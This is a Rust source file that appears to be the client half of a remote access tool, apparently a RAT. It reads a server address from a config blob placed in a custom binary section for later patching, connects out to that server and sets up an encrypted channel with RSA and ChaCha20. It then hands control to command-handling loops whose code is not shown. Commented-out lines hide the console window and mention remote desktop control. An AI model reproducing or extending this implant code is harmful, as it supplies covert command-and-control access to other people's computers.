//#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
//#![cfg_attr(debug_assertions, windows_subsystem = "windows")]

#[no_mangle]
#[link_section = ".zzz"]
static CONFIG: [u8; 1024] = [0; 1024];

// use std::net::TcpStream;

use std::sync::{ Arc, Mutex };
use std::thread::sleep;
use once_cell::sync::Lazy;


use winapi::um::winuser::SetProcessDPIAware;

// use crate::handler::handle_server;

pub mod features;
pub mod service;
// pub mod handler;
pub mod handler;

/////// NEW ///////
use tokio::net::TcpStream;
use common::async_impl::connection::Connection;
use common::async_impl::packets::*;
use rand::{rngs::OsRng, Rng, SeedableRng};
use rsa::PaddingScheme;
use rsa::PublicKey;
use rand_chacha::ChaCha20Rng;
use tokio::sync::oneshot;



///////////////////

static SECRET_INITIALIZED: Lazy<Mutex<bool>> = Lazy::new(|| Mutex::new(false));
static SECRET: Lazy<Mutex<[u8; common::SECRET_LEN]>> = Lazy::new(||
    Mutex::new([0u8; common::SECRET_LEN])
);

#[tokio::main(flavor = "current_thread")]
async fn main() {
    let config = service::config::get_config();

    let socket = TcpStream::connect(format!("{}:{}", config.ip, config.port)).await.unwrap();

    let connection = Connection::<ClientboundPacket, ServerboundPacket>::new(socket);
    let (mut reader, mut writer) = connection.split();

    let secret = None;
    let mut nonce_generator_write = None;
    let mut nonce_generator_read = None;

    writer
    .write_packet(
        ServerboundPacket::EncryptionRequest,
        &secret,
        nonce_generator_write.as_mut(),
    )
    .await
    .unwrap();

    let pub_key: rsa::RsaPublicKey;

    let token = if let Ok(Some(p)) = reader
        .read_packet(&secret, nonce_generator_read.as_mut())
        .await
    {
        match p {
            ClientboundPacket::EncryptionResponse(pub_key_der, token_) => {
                pub_key = rsa::pkcs8::FromPublicKey::from_public_key_der(&pub_key_der).unwrap();
                assert_eq!(common::ENC_TOK_LEN, token_.len());
                token_
            }
            _ => {
                std::process::exit(1)
            }
        }
    } else {
        std::process::exit(1)
    };

    let mut secret = [0u8; common::SECRET_LEN];
    OsRng.fill(&mut secret);

        let padding = PaddingScheme::new_pkcs1v15_encrypt();
        let enc_secret = pub_key
            .encrypt(&mut OsRng, padding, &secret[..])
            .expect("failed to encrypt");
        let padding = PaddingScheme::new_pkcs1v15_encrypt();
        let enc_token = pub_key
            .encrypt(&mut OsRng, padding, &token[..])
            .expect("failed to encrypt");
        writer
            .write_packet(
                ServerboundPacket::EncryptionConfirm(enc_secret, enc_token),
                &None,
                nonce_generator_write.as_mut(),
            )
            .await
            .unwrap();

        let secret = Some(secret.to_vec());
        SECRET.lock().unwrap().copy_from_slice(&secret.as_ref().unwrap()[..]);
        let mut seed = [0u8; common::SECRET_LEN];
        seed.copy_from_slice(&secret.as_ref().unwrap()[..]);
        nonce_generator_write = Some(ChaCha20Rng::from_seed(seed));
        nonce_generator_read = Some(ChaCha20Rng::from_seed(seed));

        // Expect EncryptionAck (should be encrypted)
        let p = reader
            .read_packet(&secret, nonce_generator_read.as_mut())
            .await;
        match p {
            Ok(Some(ClientboundPacket::EncryptionAck)) => {
            }
            Ok(_) => {
                std::process::exit(1);
            }
            Err(e) => {
                println!("{}", e);
                std::process::exit(1);
            }
        }

    let (tx, rx) = oneshot::channel::<()>();

    let write_task = tokio::spawn(
        handler::writing_loop(writer, rx, secret.clone(), nonce_generator_write)
    );
    
    tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
    
    handler::reading_loop(reader, tx, secret.clone(), nonce_generator_read).await;
    
    if let Err(e) = write_task.await {
        println!("Write task error: {}", e);
    }

    // let is_connected = Arc::new(Mutex::new(false));
    // let is_connecting = Arc::new(Mutex::new(false));


    // unsafe {
    //     // Fix DPI issues with remote desktop control
    //     SetProcessDPIAware();
    // }

    // loop {
    //     let config_clone = config.clone();
    //     let is_connected_clone = is_connected.clone();
    //     let is_connecting_clone = is_connecting.clone();

    //     if *is_connecting.lock().unwrap() {
    //         sleep(std::time::Duration::from_secs(5));
    //         continue;
    //     }

    //     if *is_connected_clone.lock().unwrap() {
    //         sleep(std::time::Duration::from_secs(5));
    //         continue;
    //     } else {
    //     }

    //     std::thread::spawn(move || {
    //         println!("Connecting to server...");
    //         {
    //             *is_connecting_clone.lock().unwrap() = true;
    //         }
    //         let stream = TcpStream::connect(format!("{}:{}", config_clone.ip, config_clone.port));

    //         match stream {
    //             Ok(str) => {
    //                 {
    //                     *is_connected_clone.lock().unwrap() = true;
    //                     *is_connecting_clone.lock().unwrap() = false;
    //                 }
    //                 handle_server(
    //                     str.try_clone().unwrap(),
    //                     str.try_clone().unwrap(),
    //                     is_connected_clone,
    //                     is_connecting_clone
    //                 );
    //             }
    //             Err(e) => {
    //                 println!("Failed to connect to server: {}", e);
    //                 {
    //                     *is_connecting_clone.lock().unwrap() = false;
    //                     *is_connected_clone.lock().unwrap() = false;
    //                 }
    //                 return;
    //             }
    //         }
    //     });
    //     sleep(std::time::Duration::from_secs(5));
    // }
}